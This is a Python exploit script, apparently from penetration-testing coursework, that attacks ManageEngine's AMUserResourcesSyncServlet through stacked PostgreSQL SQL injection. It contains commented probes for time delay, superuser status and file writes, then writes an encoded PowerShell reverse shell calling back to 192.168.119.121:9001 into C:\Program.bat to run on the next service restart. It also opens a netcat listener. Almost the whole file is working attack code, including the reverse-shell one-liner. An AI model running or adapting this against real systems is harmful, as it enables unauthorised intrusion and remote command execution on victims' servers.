import sys
import requests
import subprocess
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def start_listener():
    proc = subprocess.Popen('konsole -e /usr/bin/rlwrap /bin/nc -lvp 9001', shell =True)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)

    t = sys.argv[1]

    # go to sleep sweet database
    #sqli = "select+pg_sleep(10);"

    # am I admin?
    #sqli = "select+case+when(select+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+;"

    # write a file
    #sqli = "COPY+(SELECT+$$THIS+IS+A+TEST$$)+to+$$c:\\offsec.txt$$;--+"
    # r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t,
    #				  params='ForMasRange=1&userId=1;%s' % sqli, verify=False)

    # send payload
    # reverse shell payload 192.168.119.121:9001
    # start /b powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.121',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    encoded_payload = "%63%33%52%68%63%6e%51%67%4c%32%49%67%63%47%39%33%5a%58%4a%7a%61%47%56%73%62%43%41%74%62%6d%39%77%49%43%31%6a%49%43%49%6b%59%32%78%70%5a%57%35%30%49%44%30%67%54%6d%56%33%4c%55%39%69%61%6d%56%6a%64%43%42%54%65%58%4e%30%5a%57%30%75%54%6d%56%30%4c%6c%4e%76%59%32%74%6c%64%48%4d%75%56%45%4e%51%51%32%78%70%5a%57%35%30%4b%43%63%78%4f%54%49%75%4d%54%59%34%4c%6a%45%78%4f%53%34%78%4d%6a%45%6e%4c%44%6b%77%4d%44%45%70%4f%79%52%7a%64%48%4a%6c%59%57%30%67%50%53%41%6b%59%32%78%70%5a%57%35%30%4c%6b%64%6c%64%46%4e%30%63%6d%56%68%62%53%67%70%4f%31%74%69%65%58%52%6c%57%31%31%64%4a%47%4a%35%64%47%56%7a%49%44%30%67%4d%43%34%75%4e%6a%55%31%4d%7a%56%38%4a%53%56%37%4d%48%30%37%64%32%68%70%62%47%55%6f%4b%43%52%70%49%44%30%67%4a%48%4e%30%63%6d%56%68%62%53%35%53%5a%57%46%6b%4b%43%52%69%65%58%52%6c%63%79%77%67%4d%43%77%67%4a%47%4a%35%64%47%56%7a%4c%6b%78%6c%62%6d%64%30%61%43%6b%70%49%43%31%75%5a%53%41%77%4b%58%73%37%4a%47%52%68%64%47%45%67%50%53%41%6f%54%6d%56%33%4c%55%39%69%61%6d%56%6a%64%43%41%74%56%48%6c%77%5a%55%35%68%62%57%55%67%55%33%6c%7a%64%47%56%74%4c%6c%52%6c%65%48%51%75%51%56%4e%44%53%55%6c%46%62%6d%4e%76%5a%47%6c%75%5a%79%6b%75%52%32%56%30%55%33%52%79%61%57%35%6e%4b%43%52%69%65%58%52%6c%63%79%77%77%4c%43%41%6b%61%53%6b%37%4a%48%4e%6c%62%6d%52%69%59%57%4e%72%49%44%30%67%4b%47%6c%6c%65%43%41%6b%5a%47%46%30%59%53%41%79%50%69%59%78%49%48%77%67%54%33%56%30%4c%56%4e%30%63%6d%6c%75%5a%79%41%70%4f%79%52%7a%5a%57%35%6b%59%6d%46%6a%61%7a%49%67%50%53%41%6b%63%32%56%75%5a%47%4a%68%59%32%73%67%4b%79%41%6e%55%46%4d%67%4a%79%41%72%49%43%68%77%64%32%51%70%4c%6c%42%68%64%47%67%67%4b%79%41%6e%50%69%41%6e%4f%79%52%7a%5a%57%35%6b%59%6e%6c%30%5a%53%41%39%49%43%68%62%64%47%56%34%64%43%35%6c%62%6d%4e%76%5a%47%6c%75%5a%31%30%36%4f%6b%46%54%51%30%6c%4a%4b%53%35%48%5a%58%52%43%65%58%52%6c%63%79%67%6b%63%32%56%75%5a%47%4a%68%59%32%73%79%4b%54%73%6b%63%33%52%79%5a%57%46%74%4c%6c%64%79%61%58%52%6c%4b%43%52%7a%5a%57%35%6b%59%6e%6c%30%5a%53%77%77%4c%43%52%7a%5a%57%35%6b%59%6e%6c%30%5a%53%35%4d%5a%57%35%6e%64%47%67%70%4f%79%52%7a%64%48%4a%6c%59%57%30%75%52%6d%78%31%63%32%67%6f%4b%58%30%37%4a%47%4e%73%61%57%56%75%64%43%35%44%62%47%39%7a%5a%53%67%70%49%67%3d%3d"
    
    destination = "C:\\Program.bat"
    print("sending reverse shell payload")
    sqli = "COPY+(SELECT+CONVERT_FROM(DECODE($$"+encoded_payload+"$$,$$base64$$),$$utf-8$$))+to+$$"+destination+"$$;"
    r = requests.post('https://%s:8443/servlet/AMUserResourcesSyncServlet' %
                      t, params='ForMasRange=1&userId=1;%s' % sqli, verify=False)
    if (r.status_code == 200):
        print("reverse shell has been uploaded")
        print("Starting the listener")
        print("shell will be activated at next ManageEngine service restart")
        nc = threading.Thread(start_listener())
        nc.start()
        exit()
    else:
        print("There was an error uploading the reverse shell\nterminating")
        exit()
    #print(r.headers)

if __name__ == '__main__':
    main()
